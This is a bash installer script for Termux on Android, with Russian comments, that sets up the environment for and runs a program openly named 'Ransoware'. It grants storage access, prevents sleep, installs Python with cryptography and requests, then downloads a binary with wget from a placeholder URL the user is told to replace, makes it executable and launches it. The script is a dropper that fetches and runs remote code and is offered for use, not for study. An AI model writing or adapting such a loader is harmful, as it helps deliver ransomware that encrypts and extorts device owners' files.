#!/data/data/com.termux/files/usr/bin/bash

# Цвета для вывода
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Функция для вывода сообщений
print_msg() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Запрос разрешения на хранение
print_msg "Запрос разрешения для термукса"
termux-setup-storage
sleep 2

# Предотвращение сна устройства
print_msg "Предотвращение сна устройства..."
termux-wake-lock
sleep 1

# Обновление пакетов
print_msg "Обновление пакетов Termux..."
pkg update -y && pkg upgrade -y
if [ $? -eq 0 ]; then
    print_success "Пакеты обновлены"
else
    print_error "Ошибка обновления пакетов"
    exit 1
fi

# Установка зависимостей
print_msg "Установка Python и Git..."
pkg install python git -y
if [ $? -eq 0 ]; then
    print_success "Python и Git установлены"
else
    print_error "Ошибка установки Python и Git"
    exit 1
fi

# Установка cryptography через pkg
print_msg "Установка python-cryptography..."
pkg install python-cryptography -y
if [ $? -eq 0 ]; then
    print_success "python-cryptography установлен"
else
    print_warning "Не удалось установить через pkg, пробуем через pip..."
    pip install cryptography
    if [ $? -eq 0 ]; then
        print_success "cryptography установлен через pip"
    else
        print_error "Ошибка установки cryptography"
        exit 1
    fi
fi

# Установка requests
print_msg "Установка requests..."
pip install requests
if [ $? -eq 0 ]; then
    print_success "requests установлен"
else
    print_error "Ошибка установки requests"
    exit 1
fi

# Проверка/создание директории
print_msg "Проверка директории Ransoware372..."
if [ ! -d "Ransoware372" ]; then
    mkdir -p Ransoware372
    print_success "Директория создана"
else
    print_warning "Директория уже существует"
fi

# Переход в директорию
cd Ransoware372
print_msg "Переход в директорию Ransoware372..."

# Проверка существования бинарного файла
if [ -f "Ransoware" ]; then
    print_warning "Бинарный файл уже существует"
    read -p "Перезаписать? (y/n): " choice
    if [[ $choice == "y" || $choice == "Y" ]]; then
        rm -f Ransoware
        print_msg "Старый файл удален"
    fi
fi

# Скачивание бинарного файла (пример URL - замените на реальный)
print_msg "Скачивание бинарного файла..."
# ЗАМЕНИТЕ ССЫЛКУ НА ВАШУ РЕАЛЬНУЮ ССЫЛКУ
wget -O Ransoware https://ваш-сайт.com/path/to/Ransoware
if [ $? -eq 0 ]; then
    print_success "Бинарный файл скачан"
else
    print_error "Ошибка скачивания файла"
    print_warning "Попробуйте скачать вручную и поместить в Ransoware372/"
    exit 1
fi

# Установка прав на выполнение
print_msg "Установка прав на выполнение..."
chmod +x Ransoware
if [ $? -eq 0 ]; then
    print_success "Права установлены"
else
    print_error "Ошибка установки прав"
    exit 1
fi

# Запуск
print_success "Все зависимости установлены!"
echo ""
print_msg "Запуск Ransoware..."
echo ""

# Проверка перед запуском
if [ -x "Ransoware" ]; then
    ./Ransoware
else
    print_error "Файл Ransoware не исполняемый или не существует"
    print_msg "Запустите вручную: cd Ransoware372 && chmod +x Ransoware && ./Ransoware"
    exit 1
fi